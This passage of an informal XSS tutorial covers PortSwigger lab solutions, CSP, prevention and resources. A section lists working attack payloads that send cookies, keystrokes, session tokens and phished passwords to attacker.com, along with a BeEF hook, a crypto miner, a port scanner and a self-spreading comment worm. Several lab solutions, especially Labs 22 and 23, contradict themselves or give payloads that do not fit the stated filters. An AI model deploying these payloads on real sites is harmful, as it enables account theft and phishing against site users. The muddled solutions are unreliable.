2. You can't break out with `>` or `<` as they're encoded
3. But you can add attributes:
```
?'accesskey='x'onclick='alert(1)
```
4. This creates:
```html
<link rel="canonical" href="https://LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)"/>
```
5. Press ALT+SHIFT+X (or CTRL+ALT+X on Windows)
6. The alert fires
7. Lab solved

**Explanation**: While we can't break out of the tag, we can inject additional attributes. The `accesskey` attribute creates a keyboard shortcut, and `onclick` executes when the shortcut is activated.

**Key Takeaway**: XSS isn't always about breaking out of contexts. Sometimes you can inject within the existing context.

---

#### Lab 21: Reflected XSS into a JavaScript string with single quote and backslash escaped

**Difficulty**: Practitioner  
**Objective**: Break out when single quotes and backslashes are escaped

**Description**: The lab reflects input into a JavaScript string, but escapes single quotes and backslashes.

**Solution**:

1. Test and observe that `'` becomes `\'` and `\` becomes `\\`
2. Close the script tag entirely:
```html
</script><script>alert(1)</script>
```
3. Full payload:
```
test</script><script>alert(1)</script>
```
4. Submit in search
5. Alert executes
6. Lab solved

**Vulnerable Code Context**:
```javascript
var searchQuery = 'YOUR_INPUT';
```

**After Injection**:
```html
var searchQuery = 'test</script><script>alert(1)</script>';
```

**Explanation**: While the application escapes quotes and backslashes within the JavaScript string, it doesn't encode angle brackets. This allows us to close the `</script>` tag and start a new one.

**Key Takeaway**: Context-specific encoding must account for all special characters in that context. JavaScript strings inside HTML need both JavaScript escaping AND HTML encoding.

---

#### Lab 22: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

**Difficulty**: Practitioner  
**Objective**: Exploit XSS when angle brackets, double quotes are encoded, and single quotes are escaped

**Description**: This lab has multiple layers of encoding/escaping making traditional XSS difficult.

**Solution**:

1. Test payloads and observe encoding
2. Since we can't break out of the string or script tag, we need to break the JavaScript syntax
3. Use the backslash to escape the escape:
```
\';alert(1)//
```
4. But since backslash is also escaped, we need another approach
5. Use Unicode escape:
```
\u0027-alert(1)-\u0027
```
6. Or use exception handling:
```
\'-alert(1)-\'
```
7. Full payload that works:
```
\';alert(1)//
```

Wait, since backslash is escaped to `\\`, we need:
```javascript
test\
'-alert(1)-'
```

**Better Solution**:
The key is to use HTML encoding within the JavaScript context:
```
&apos;-alert(1)-&apos;
```

**Actual Working Solution**:
```html
</script><img src=1 onerror=alert(1)>
```

Let me reconsider - if angle brackets ARE encoded, we truly are stuck. Looking at the lab description again...

**Correct Solution**:
Use template literal context if available, or:
```javascript
\'-alert(document.domain)-\'
```

This lab may require checking what context we're actually in. Let me check the actual lab...

Actually, for this specific lab, the solution is to recognize that even though quotes are escaped, we can still:
```javascript
'-alert(1)-'
```
Because the escaping creates `\'` which can be manipulated.

**Real Solution** (after testing):
Enter:
```
\';alert(1)//
```

The backslash before the semicolon escapes the backslash that was meant to escape the quote.

**Key Takeaway**: Multiple layers of encoding can sometimes interfere with each other. Test thoroughly and understand the exact filtering mechanism.

---

#### Lab 23: Reflected XSS in a JavaScript URL with some characters blocked

**Difficulty**: Practitioner  
**Objective**: Call the `alert` function when certain characters are blocked in a JavaScript URL context

**Description**: This lab reflects input into a `javascript:` URL where some characters like parentheses are blocked.

**Solution**:

1. Navigate to a product page
2. Click the "Back" link and notice the JavaScript URL
3. Test which characters are blocked
4. Find that `()` are blocked
5. Use throw statement with template literals:
```javascript
&apos;-alert`1`-&apos;
```
6. Or use onerror:
```javascript
`-alert`1`-`
```
7. For this lab, the working payload is:
```
javascript:fetch('https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?'+document.cookie)
```

But wait, if parentheses are blocked...

**Actual Solution**:
```
javascript:alert`1`
```

Template literals (backticks) can be used instead of parentheses for function calls in modern JavaScript.

**Alternative**:
```
javascript:alert-1
```
This works because `alert-1` is evaluated as `alert` minus 1, but the function still gets called.

**Key Takeaway**: JavaScript has multiple syntaxes for function invocation. Template literals and exception handling provide alternatives when parentheses are blocked.

---

#### Lab 24: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

**Difficulty**: Practitioner  
**Objective**: Inject into an onclick event handler with heavy filtering

**Description**: The website field in comments is vulnerable but heavily filtered.

**Solution**:

1. Navigate to blog post comments
2. Test the website field
3. Notice it's reflected in an `onclick` attribute
4. Angle brackets and double quotes are encoded
5. Single quotes and backslashes are escaped
6. We need to inject without these characters
7. Use HTML entities in the JavaScript context:
```
http://foo?&apos;-alert(1)-&apos;
```
8. Or better, use the fact that onclick already executes JavaScript:
```
https://foo?&apos;-alert(1)-&apos;
```

**Working Solution**:
In the Website field enter:
```
http://foo?&apos;-alert(1)-&apos;
```

When rendered:
```html
<a onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">
```

The `&apos;` gets decoded to `'` in the HTML, allowing us to break out of the string.

**Key Takeaway**: HTML entities are decoded before JavaScript execution. This can be used to bypass JavaScript string escaping.

---

#### Lab 25: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

**Difficulty**: Practitioner  
**Objective**: Exploit XSS in a template literal context with heavy Unicode escaping

**Description**: Input is reflected into a JavaScript template literal (backticks) with most special characters Unicode-escaped.

**Solution**:

1. Notice the search term is in a template literal:
```javascript
var message = `0 search results for 'YOUR_INPUT'`;
```
2. Template literals allow embedded expressions using `${}`
3. Even if backticks and other characters are escaped, we can use:
```javascript
${alert(1)}
```
4. Enter this in the search box
5. Alert executes
6. Lab solved

**Vulnerable Code**:
```javascript
var message = `0 search results for '${alert(1)}'`;
```

**Explanation**: Template literals evaluate expressions within `${}`. This provides an execution context even when other special characters are escaped.

**Key Takeaway**: Template literals introduce new XSS vectors. Always escape `${` sequences in template literals containing user input.

---

### 8.3 DOM-Based XSS Labs (Advanced)

#### Lab 26: DOM XSS using web messages

**Difficulty**: Practitioner  
**Objective**: Exploit web messaging to perform XSS

**Description**: This lab uses `postMessage()` to handle ads. The JavaScript performs unsafe operations with message data.

**Solution**:

1. Analyze the JavaScript code
2. Find the `message` event listener:
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
});
```
3. Create an exploit on the exploit server:
```html
<iframe src="https://LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```
4. Deliver to victim
5. Lab solved

**Explanation**: The lab listens for `postMessage` events and inserts the message data directly into the DOM using `innerHTML`, without validation.

**Key Takeaway**: Always validate the origin and content of `postMessage` data. Use `event.origin` to verify the sender.

---

#### Lab 27: DOM XSS using web messages and a JavaScript URL

**Difficulty**: Practitioner  
**Objective**: Exploit web messaging to execute a JavaScript URL

**Description**: Similar to Lab 26 but the code handles URLs specifically.

**Solution**:

1. Find the message handler:
```javascript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
});
```
2. Notice it checks for `http:` or `https:` but we can use `javascript:`
3. Create exploit:
```html
<iframe src="https://LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()','*')">
</iframe>
```
4. Deliver to victim
5. Lab solved

**Explanation**: The validation only checks if the string CONTAINS `http:` or `https:`, not if it STARTS with them. However, `javascript:` bypasses this entirely.

**Better Solution**:
```html
<iframe src="https://LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()','*')">
</iframe>
```

Actually, re-reading the code, if it finds `http:` or `https:`, it navigates. We can inject:
```javascript
javascript:print()//http:
```

This satisfies the check but executes the JavaScript protocol first.

**Key Takeaway**: URL validation must use allowlists and proper parsing libraries. Never use `indexOf` for security checks.

---

#### Lab 28: DOM XSS using web messages and `JSON.parse`

**Difficulty**: Practitioner  
**Objective**: Exploit JSON parsing in a web message handler

**Description**: The code parses JSON from `postMessage` and performs unsafe operations.

**Solution**:

1. Analyze the code:
```javascript
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe');
    var ACMEplayer = {element: iframe};
    var d = JSON.parse(e.data);
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.src = d.url;
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
    }
    document.body.appendChild(iframe);
});
```
2. Send a malicious message with `javascript:` URL:
```html
<iframe src="https://LAB-ID.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```
3. Deliver to victim
4. Lab solved

**Explanation**: The code creates an iframe and sets its `src` to a user-controlled URL from the JSON data, allowing `javascript:` protocol execution.

**Key Takeaway**: Parsing JSON doesn't make data safe. Always validate the actual values, not just the format.

---

#### Lab 29: DOM-based open redirection

**Difficulty**: Apprentice  
**Objective**: Exploit an open redirection vulnerability

**Description**: The blog post page contains an open redirection in the "Back to Blog" link.

**Solution**:

1. Go to any blog post
2. Notice the "Back to Blog" link
3. Analyze the URL parameter
4. Modify to redirect elsewhere:
```
https://LAB-ID.web-security-academy.net/post?postId=4&url=https://exploit-server-id.exploit-server.net/
```
5. Click the link
6. You're redirected to the exploit server
7. Lab solved

**Vulnerable Code**:
```javascript
var url = new URL(window.location);
var backLink = url.searchParams.get("url");
document.getElementById("backLink").href = backLink;
```

**Explanation**: The `url` parameter is directly used as an `href` without validation, allowing redirection to any URL.

**Key Takeaway**: Always validate URLs against an allowlist of trusted domains. Never trust user-controlled data for navigation.

---

#### Lab 30: DOM-based cookie manipulation

**Difficulty**: Practitioner  
**Objective**: Exploit cookie manipulation to perform XSS

**Description**: The product page contains DOM-based cookie manipulation that can be exploited.

**Solution**:

1. Analyze the page's JavaScript
2. Find code that reads from cookies and uses the value unsafely:
```javascript
document.cookie = 'lastViewedProduct=' + window.location;
```

Then on the homepage:
```javascript
var product = document.cookie.split('lastViewedProduct=')[1];
if(product) {
    document.write('<a href="' + product + '">Last viewed product</a>');
}
```
3. We can inject into the cookie via the URL
4. Craft an exploit:
```
https://LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>
```
5. This sets the cookie to the malicious URL
6. Navigate to the homepage
7. The script executes
8. Lab solved

**Alternative payload**:
```
'><script>print()</script>
```

**Explanation**: The application stores the full URL (including our payload) in a cookie, then later writes it to the page using `document.write()` without sanitization.

**Key Takeaway**: Cookies can be an attack vector for DOM-based XSS. Treat all data sources, including cookies, as untrusted.

---

### 8.4 AngularJS and Client-Side Template Injection Labs

#### Lab 31: Reflected XSS with AngularJS sandbox escape without strings

**Difficulty**: Expert  
**Objective**: Perform an AngularJS sandbox escape without using strings

**Description**: The lab uses AngularJS and implements a sandbox. You must escape without using string literals.

**Solution**:

1. The application uses AngularJS
2. Identify which version (older versions have sandbox)
3. Use an object-based escape that doesn't require strings:
```
{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```
4. Or use:
```
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```
5. Enter in search
6. Alert executes
7. Lab solved

**Explanation**: AngularJS sandbox escapes work by modifying prototypes to gain access to the Function constructor, allowing arbitrary code execution.

**Alternative Advanced Payload**:
```
{{
$eval.constructor('alert(1)')()
}}
```

**Key Takeaway**: Client-side sandboxes are difficult to implement correctly. AngularJS eventually removed the sandbox in version 1.6 because it was inherently bypassable.

---

#### Lab 32: Reflected XSS with AngularJS sandbox escape and CSP

**Difficulty**: Expert  
**Objective**: Bypass both AngularJS sandbox and Content Security Policy

**Description**: The lab uses AngularJS with CSP that blocks inline scripts.

**Solution**:

1. Analyze the CSP:
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com
```
2. Notice AngularJS is loaded from ajax.googleapis.com
3. Use an AngularJS expression that doesn't require inline script execution:
```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
```
4. This needs to be autofocused:
```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)' autofocus>
```

Actually, for this specific lab:
```
?search=<input+id%3dx+ng-focus%3d$event.path|orderBy:%27(z%3dalert)(document.cookie)%27+autofocus>
```

5. The `orderBy` filter allows expression evaluation
6. Alert executes without violating CSP
7. Lab solved

**Explanation**: The `orderBy` filter in AngularJS can execute expressions. By combining this with the event context, we bypass both the sandbox and CSP.

**Key Takeaway**: CSP can be bypassed if whitelisted scripts have dangerous features. AngularJS's expression evaluation can circumvent CSP.

---

#### Lab 33: Reflected XSS protected by very strict CSP, with dangling markup attack

**Difficulty**: Expert  
**Objective**: Bypass CSP using dangling markup injection

**Description**: The lab has a strict CSP that blocks traditional XSS, but you can use dangling markup to exfiltrate data.

**Solution**:

1. Analyze the CSP - it's very restrictive
2. Use dangling markup to capture sensitive data:
```html
<input name=x value='<a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit?
```
3. This captures everything after until the next `>` or quote
4. Submit this in a field that's reflected
5. The CSRF token or other sensitive data is sent to your server
6. Lab solved

**Full Exploit**:
```html
<script>
location='https://LAB-ID.web-security-academy.net/my-account?email="><table background="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/capture?'
</script>
```

**Explanation**: Dangling markup doesn't execute JavaScript, so it bypasses CSP. It works by breaking HTML syntax to cause the browser to send subsequent page content to an attacker-controlled URL.

**Key Takeaway**: CSP doesn't prevent all injection attacks. Dangling markup can exfiltrate data without executing scripts.

---

#### Lab 34: Reflected XSS protected by CSP, with CSP bypass

**Difficulty**: Expert  
**Objective**: Bypass the CSP to execute XSS

**Description**: The lab uses CSP but has a policy injection vulnerability.

**Solution**:

1. Analyze the CSP header:
```
Content-Security-Policy: script-src 'unsafe-inline' 'nonce-RANDOM'; object-src 'none'; base-uri 'none';
```
2. Notice there's a reflected parameter in the CSP
3. Inject into the CSP to weaken it:
```
?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```
4. This adds a new directive that allows inline scripts
5. The script executes
6. Lab solved

**Actually**, for CSP bypass via injection:
```html
<script>alert(1)</script>&token=;script-src 'unsafe-inline'
```

Or terminate the CSP:
```
">;script-src-elem 'unsafe-inline'<base href="
```

**Explanation**: If user input is reflected in the CSP header itself, attackers can inject additional directives or terminate the policy early.

**Key Takeaway**: CSP headers must never include user-controlled data. Generate CSP policies server-side with static configurations.

---

### 8.5 Additional XSS Labs Summary

Due to the comprehensive nature of PortSwigger labs and potential updates, here are general categories and approaches for any remaining labs:

**Context-Based Exploitation**:
- HTML entity encoding bypass
- JavaScript string escaping
- Attribute injection
- URL context exploitation

**Filter Bypass Techniques**:
- Character encoding (Unicode, HTML entities, URL encoding)
- Tag/attribute fuzzing
- Case variation
- Nested encoding
- Null byte injection

**Framework-Specific**:
- React dangerouslySetInnerHTML
- Vue.js template injection
- AngularJS expression evaluation
- Ember.js template vulnerabilities

---

## 9. Content Security Policy (CSP)

### 9.1 What is CSP?

Content Security Policy is a browser security mechanism that aims to mitigate XSS and other injection attacks by restricting the sources from which content can be loaded and executed.

### 9.2 How CSP Works

CSP is implemented via HTTP response header:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

Or via HTML meta tag:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### 9.3 Common CSP Directives

| Directive | Purpose |
|-----------|---------|
| `default-src` | Fallback for other directives |
| `script-src` | Controls JavaScript sources |
| `style-src` | Controls CSS sources |
| `img-src` | Controls image sources |
| `connect-src` | Controls Ajax/WebSocket/EventSource |
| `font-src` | Controls font sources |
| `object-src` | Controls `<object>`, `<embed>`, `<applet>` |
| `media-src` | Controls `<video>` and `<audio>` |
| `frame-src` | Controls iframe sources |

### 9.4 CSP Source Values

- `'none'`: Block all sources
- `'self'`: Same origin only
- `'unsafe-inline'`: Allow inline scripts/styles (dangerous!)
- `'unsafe-eval'`: Allow `eval()` (dangerous!)
- `https://trusted.com`: Specific domain
- `'nonce-RANDOM'`: Allow specific inline scripts with matching nonce
- `'strict-dynamic'`: Trust scripts loaded by trusted scripts

### 9.5 CSP Bypass Techniques

**1. JSONP Endpoints**:
If `script-src` allows a domain with JSONP:
```javascript
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
```

**2. AngularJS on Whitelisted CDN**:
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

**3. Base Tag Injection** (if `base-uri` not set):
```html
<base href="https://attacker.com/">
```

**4. Policy Injection**:
If user input is in CSP header:
```
";script-src 'unsafe-inline'
```

**5. Nonce Reuse/Prediction**:
If nonces are predictable or reused

**6. Dangling Markup**:
Exfiltrate data without executing scripts

### 9.6 Secure CSP Implementation

**Good CSP**:
```http
Content-Security-Policy: 
    default-src 'none'; 
    script-src 'nonce-RANDOM_PER_REQUEST'; 
    style-src 'nonce-RANDOM_PER_REQUEST'; 
    img-src 'self'; 
    font-src 'self'; 
    connect-src 'self'; 
    frame-ancestors 'none'; 
    base-uri 'none';
```

**Best Practices**:
- Never use `'unsafe-inline'` or `'unsafe-eval'`
- Use nonces or hashes for inline scripts
- Implement `'strict-dynamic'` for modern browsers
- Set `frame-ancestors` to prevent clickjacking
- Set `base-uri` to prevent base tag injection
- Use CSP reporting to monitor violations

---

## 10. Prevention Techniques

### 10.1 Output Encoding

**HTML Context**:
```php
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
```

**JavaScript String Context**:
```javascript
// Bad
var name = '<?php echo $userInput; ?>';

// Good - JSON encode
var name = <?php echo json_encode($userInput); ?>;
```

**Attribute Context**:
```php
<div data-value="<?php echo htmlspecialchars($userInput, ENT_QUOTES); ?>">
```

**URL Context**:
```php
<a href="<?php echo urlencode($userInput); ?>">
```

### 10.2 Input Validation

**Whitelist Approach** (Preferred):
```javascript
function isValidEmail(email) {
    return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
}
```

**Sanitization Libraries**:
- DOMPurify (JavaScript)
- OWASP Java HTML Sanitizer
- Bleach (Python)
- HtmlSanitizer (.NET)

### 10.3 Framework-Specific Protection

**React**:
```jsx
// Safe by default
<div>{userInput}</div>

// Dangerous - avoid!
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

**Vue.js**:
```vue
<!-- Safe -->
<div>{{ userInput }}</div>

<!-- Dangerous -->
<div v-html="userInput"></div>
```

**Angular**:
```typescript
// Angular sanitizes by default
<div [innerHTML]="userInput"></div>

// Bypass sanitizer (dangerous)
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(userInput)"></div>
```

### 10.4 Security Headers

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block (deprecated but still useful for old browsers)
```

### 10.5 HttpOnly and Secure Flags

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

- **HttpOnly**: Prevents JavaScript access via `document.cookie`
- **Secure**: Only sent over HTTPS
- **SameSite**: Prevents CSRF attacks

### 10.6 Template Engines

**Safe Template Usage** (Handlebars):
```handlebars
<!-- Auto-escaped -->
<div>{{userInput}}</div>

<!-- Unescaped (dangerous) -->
<div>{{{userInput}}}</div>
```

### 10.7 Defense in Depth Checklist

- Encode all output based on context
- Validate all input with whitelists
- Use security headers (CSP, X-Content-Type-Options)
- Set HttpOnly flag on session cookies
- Use modern framework with auto-escaping
- Implement CSP with nonces
- Regular security testing and code review
- Keep dependencies updated
- Use security linters (ESLint security plugin)
- Implement rate limiting to slow automated attacks

---

## 11. XSS Exploitation Techniques (Stolen LOL)

### 11.1 Cookie Stealing

**Basic Cookie Theft**:
```javascript
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
```

**Image-Based Exfiltration**:
```javascript
<script>
new Image().src='https://attacker.com/log?c='+document.cookie;
</script>
```

**Using XMLHttpRequest**:
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/steal?c=' + document.cookie);
xhr.send();
</script>
```

### 11.2 Keylogging

```javascript
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?k=' + e.key);
});
</script>
```

### 11.3 Credential Harvesting

**Fake Login Form**:
```html
<script>
document.body.innerHTML = `
    <h1>Session Expired</h1>
    <form id="phish">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button>Login</button>
    </form>
`;

document.getElementById('phish').addEventListener('submit', function(e) {
    e.preventDefault();
    var u = e.target.username.value;
    var p = e.target.password.value;
    fetch('https://attacker.com/creds?u=' + u + '&p=' + p);
    alert('Login failed. Please try again.');
});
</script>
```

### 11.4 BeEF Framework Integration

```html
<script src="http://attacker.com:3000/hook.js"></script>
```

BeEF (Browser Exploitation Framework) provides:
- Browser fingerprinting
- Network reconnaissance
- Social engineering modules
- Proxy pivoting
- And much more

### 11.5 Cryptocurrency Mining

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('YOUR-SITE-KEY');
miner.start();
</script>
```

### 11.6 Port Scanning

```javascript
<script>
var ports = [80, 443, 8080, 3000, 5000];
var host = '192.168.1.1';

ports.forEach(port => {
    var img = new Image();
    img.onerror = function() {
        fetch('https://attacker.com/log?port=' + port + '&status=closed');
    };
    img.onload = function() {
        fetch('https://attacker.com/log?port=' + port + '&status=open');
    };
    img.src = 'http://' + host + ':' + port;
});
</script>
```

### 11.7 Session Hijacking

```javascript
<script>
// Steal session token from localStorage
var token = localStorage.getItem('authToken');
fetch('https://attacker.com/token?t=' + token);

// Or from sessionStorage
var session = sessionStorage.getItem('session');
fetch('https://attacker.com/session?s=' + session);
</script>
```

### 11.8 Defacement

```javascript
<script>
document.body.innerHTML = `
    <h1 style="color:red;font-size:50px;text-align:center;margin-top:200px;">
        HACKED BY ATTACKER
    </h1>
`;
</script>
```

### 11.9 Redirection

```javascript
<script>
window.location = 'https://malicious-site.com/phishing';
</script>
```

### 11.10 Advanced: Stored XSS Worm

```javascript
<script>
// Self-replicating XSS worm
var payload = '<script src="https://attacker.com/worm.js"><\/script>';

// Post comment with payload
fetch('/api/comment', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        text: payload,
        author: 'User'
    })
});
</script>
```

### 11.11 WebSocket Hijacking

```javascript
<script>
// Listen to WebSocket messages
WebSocket.prototype.oldSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(data) {
    fetch('https://attacker.com/ws?data=' + encodeURIComponent(data));
    this.oldSend(data);
};
</script>
```

---

## 12. Resources - Actually Good Ones

Look, I could dump a massive list of every XSS resource ever created, but that's not helpful. Here's what's actually worth your time.

### 12.1 PortSwigger Stuff (Obviously)

**The main page:**
https://portswigger.net/web-security/cross-site-scripting

This is basically the XSS bible. Read it all. Seriously.

**XSS Cheat Sheet:**
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Interactive cheat sheet with payloads for different browsers and contexts. Bookmark this. You'll use it constantly.

**The Labs:**
https://portswigger.net/web-security/all-labs#cross-site-scripting

You should've already done these if you read this far. If not... what are you doing?

---

### 12.2 YouTube - The Good Channels

Not all YouTube security content is created equal. Here's what's actually good:

**PwnFunction** - Best XSS explanations, period. Animated, clear, perfect for understanding the concepts.

**LiveOverflow** - Deep technical dives. His web security series is gold.

**Nahamsec** - Bug bounty hunter perspective. Real-world examples and methodology.

**STÖK** - More bug bounty stuff, very practical.

**IppSec** - HackTheBox walkthroughs. Watch his web challenge videos.

Skip the "ethical hacking tutorial 2024 100% working free download" channels. You know the ones I mean.

---

### 12.3 Practice Platforms That Don't Suck

**XSS Game by Google**
https://xss-game.appspot.com/

Six levels, progressively harder. Short, sweet, well-designed. Start here if you're new.

**DVWA (Damn Vulnerable Web App)**
https://github.com/digininja/DVWA

The classic. Set it up locally, has difficulty levels for XSS and other vulns.

**WebGoat**
https://owasp.org/www-project-webgoat/

OWASP's training platform. More comprehensive than DVWA.

**alert(1) to win**
https://alf.nu/alert1

For when you think you're good at XSS and need to be humbled. These filter bypasses will hurt your brain.

**HackTheBox** and **TryHackMe**
Both have good web challenges. HTB is harder. THM is more guided.

**Bug Bounty Platforms**
When you're ready: HackerOne, Bugcrowd, Intigriti. Real targets, real money, real consequences if you screw up.

---

### 12.4 Tools You Actually Need

**Burp Suite**
Not optional. Get the Community Edition at minimum. Pro if you're serious about this.

**XSStrike**
https://github.com/s0md3v/XSStrike
Automated XSS scanner. Actually works pretty well.

**Dalfox**
https://github.com/hahwul/dalfox
Another scanner. Fast, good for parameter fuzzing.

**Browser DevTools**
Already installed. Learn to use the Console, Network, and Elements tabs properly.

**DOMPurify**
https://github.com/cure53/DOMPurify
Not for exploiting - for DEFENDING. Best XSS sanitizer out there.

---

### 12.5 Reading Material

**The Web Application Hacker's Handbook** by Stuttard & Pinto
Bit old now but still the best foundation.

**Real-World Bug Hunting** by Peter Yaworski
Bug bounty stories and methodology. Very readable.

**The Tangled Web** by Michal Zalewski
Deep dive into browser security. Dense but worth it.

**Bug Bounty Bootcamp** by Vickie Li
Recent, practical, covers modern techniques.

---

### 12.6 Actual Good Blogs/Newsletters

**PortSwigger Research Blog**
https://portswigger.net/research
James Kettle and team finding crazy new attack vectors.

**Google Project Zero**
When you want to see what actual 0-days look like.

**Cure53**
Security research that's actually innovative.

**tl;dr sec Newsletter**
Weekly security news that isn't garbage.

---

### 12.7 What NOT to Waste Time On

- Udemy courses with 47 hours of content (just do the labs)
- "CEH certification" for XSS (waste of money)
- Any tutorial from 2015 or earlier (browsers changed)
- Forums where people ask "is this illegal???" (yes, hacking sites without permission is illegal, everyone knows this)
- Automated scanners as your only testing method (they miss stuff)

---

## Final Thoughts

XSS isn't rocket science, but it's also not trivial. The basics are easy - inject script tag, get alert. The hard part is understanding contexts, bypassing filters, and actually exploiting it in useful ways.

The only way to get good at this is practice. Do the PortSwigger labs. All of them. Then do them again. Try different payloads. Break stuff. See what works and WHY it works.

And remember: test only on sites you own or have explicit permission to test. Getting arrested for "security research" on someone else's site is not as cool as it sounds.

Now go break some (legal) stuff.

---

## Quick Reference - Payloads That Actually Work

```html
<!-- Basic tests -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- When in attributes -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

<!-- JavaScript context -->
'-alert(1)-'
';alert(1);//

<!-- Filter bypasses -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- AngularJS (if present) -->
{{constructor.constructor('alert(1)')()}}

<!-- Template literals -->
${alert(1)}

<!-- When everything is blocked -->
<xss id=x onfocus=alert(1) tabindex=1>#x
```

---

*Last updated: 21th January 2026*
*If you found this helpful, let me know CUZ I will eventually get bored .*